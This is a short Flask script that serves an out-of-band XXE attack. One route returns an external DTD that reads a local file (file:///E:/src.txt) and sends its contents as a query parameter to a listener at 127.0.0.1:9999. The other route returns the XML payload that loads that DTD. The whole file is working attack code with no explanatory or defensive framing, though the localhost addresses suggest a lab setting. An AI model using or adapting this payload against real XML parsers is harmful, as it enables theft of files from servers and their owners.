from flask import Flask

app = Flask(__name__) 

@app.route('/xxe.dtd', methods=['GET', 'POST'])
def xxe_oob():
	return '''<!ENTITY % aaaa SYSTEM "file:///E:/src.txt">
		<!ENTITY % demo "<!ENTITY bbbb SYSTEM
		'http://127.0.0.1:9999?data=%aaaa;'>"> %demo;'''

@app.route('/', methods=['GET', 'POST'])
def dtd():
	return '''<?xml version="1.0" encoding="UTF-8" ?>
		<!DOCTYPE ANY [
		<!ENTITY % xd SYSTEM "http://127.0.0.1:5000/xxe.dtd"> %xd;]>
		<root>&bbbb;</root>'''

if __name__ == '__main__':
	app.run()